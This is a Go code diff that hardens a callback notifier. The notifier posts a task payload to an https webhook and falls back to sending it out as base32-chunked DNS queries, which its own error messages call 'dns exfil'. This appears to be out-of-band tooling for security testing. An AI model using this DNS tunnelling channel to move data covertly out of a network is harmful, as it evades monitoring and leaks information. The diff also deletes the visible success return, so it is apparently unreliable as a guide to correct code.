@@ -9,6 +9,7 @@ import (
 	"io"
 	"net"
 	"net/http"
+	"net/url"
 	"strings"
 	"time"
 )
@@ -40,6 +41,7 @@ type Result struct {
 }
 
 // Notify sends payload: webhook first, then DNS on failure or if webhook unset.
+// DNS success requires every chunk query to be sent (NXDOMAIN counts; timeout does not).
 func Notify(ctx context.Context, p Payload, opts Options) (Result, error) {
 	if opts.Timeout <= 0 {
 		opts.Timeout = 15 * time.Second
@@ -69,30 +71,48 @@ func Notify(ctx context.Context, p Payload, opts Options) (Result, error) {
 		}
 	}
 
-	if res.WebhookOK || res.DNSOK {
-		return res, nil
-	}
 	if len(errs) == 0 {
 		return res, fmt.Errorf("no callback channel configured")
 	}
 	return res, fmt.Errorf("callback failed: %s", strings.Join(errs, "; "))
 }
 
-func sendWebhook(ctx context.Context, url string, timeout time.Duration, p Payload) error {
+func sendWebhook(ctx context.Context, rawURL string, timeout time.Duration, p Payload) error {
+	u, err := url.Parse(rawURL)
+	if err != nil {
+		return fmt.Errorf("invalid webhook URL: %w", err)
+	}
+	switch strings.ToLower(u.Scheme) {
+	case "https":
+		// ok
+	case "http":
+		if !isLoopbackHost(u.Hostname()) {
+			return fmt.Errorf("webhook must use https (http only allowed for loopback)")
+		}
+	default:
+		return fmt.Errorf("webhook scheme must be https")
+	}
+
 	body, err := json.Marshal(p)
 	if err != nil {
 		return err
 	}
 	reqCtx, cancel := context.WithTimeout(ctx, timeout)
 	defer cancel()
-	req, err := http.NewRequestWithContext(reqCtx, http.MethodPost, url, bytes.NewReader(body))
+	req, err := http.NewRequestWithContext(reqCtx, http.MethodPost, rawURL, bytes.NewReader(body))
 	if err != nil {
 		return err
 	}
 	req.Header.Set("Content-Type", "application/json")
 	req.Header.Set("User-Agent", "Fdoc/callback")
 
-	resp, err := http.DefaultClient.Do(req)
+	client := &http.Client{
+		Timeout: timeout,
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			return http.ErrUseLastResponse
+		},
+	}
+	resp, err := client.Do(req)
 	if err != nil {
 		return err
 	}
@@ -104,6 +124,15 @@ func sendWebhook(ctx context.Context, url string, timeout time.Duration, p Paylo
 	return nil
 }
 
+func isLoopbackHost(host string) bool {
+	host = strings.TrimSpace(strings.ToLower(host))
+	if host == "localhost" || host == "127.0.0.1" || host == "::1" {
+		return true
+	}
+	ip := net.ParseIP(host)
+	return ip != nil && ip.IsLoopback()
+}
+
 // DNS wire format: base32(no pad) of "task_id|host|url", chunked into labels.
 // Query: <seq>-<total>-<chunk>.<task_id>.<dns-base>
 func sendDNS(ctx context.Context, base string, p Payload) error {
@@ -113,7 +142,7 @@ func sendDNS(ctx context.Context, base string, p Payload) error {
 	}
 	task := sanitizeDNSLabel(p.TaskID)
 	if task == "" {
-		task = "t"
+		return fmt.Errorf("task_id %q is empty after DNS sanitize", p.TaskID)
 	}
 
 	raw := p.TaskID + "|" + p.Host + "|" + p.URL
@@ -126,34 +155,30 @@ func sendDNS(ctx context.Context, base string, p Payload) error {
 	}
 
 	resolver := net.DefaultResolver
-	var lastErr error
-	ok := 0
+	var failed []string
 	for i, chunk := range chunks {
+		if len(chunk) > 63 {
+			return fmt.Errorf("dns chunk %d label too long (%d)", i, len(chunk))
+		}
 		name := fmt.Sprintf("%d-%d-%s.%s.%s", i, len(chunks), chunk, task, base)
-		// Fire-and-forget lookup; success = query left the host.
+		if len(name) > 253 {
+			return fmt.Errorf("dns name too long (%d): chunk %d", len(name), i)
+		}
 		lookupCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
 		_, err := resolver.LookupHost(lookupCtx, name)
 		cancel()
-		if err != nil {
-			// NXDOMAIN / no answer still means the query was sent.
-			if dnsErr, okType := err.(*net.DNSError); okType {
-				if dnsErr.IsNotFound || dnsErr.IsTimeout {
-					ok++
-					continue
-				}
-			}
-			lastErr = err
-			// Still count as best-effort sent for many resolver errors.
-			ok++
+		if err == nil {
 			continue
 		}
-		ok++
-	}
-	if ok == 0 {
-		if lastErr != nil {
-			return lastErr
+		// NXDOMAIN / no such host still means the query left this host.
+		if dnsErr, ok := err.(*net.DNSError); ok && dnsErr.IsNotFound {
+			continue
 		}
-		return fmt.Errorf("dns exfil sent 0 queries")
+		failed = append(failed, fmt.Sprintf("%d:%v", i, err))
+	}
+	if len(failed) > 0 {
+		return fmt.Errorf("dns exfil incomplete (%d/%d chunks failed): %s",
+			len(failed), len(chunks), strings.Join(failed, "; "))
 	}
 	return nil
 }
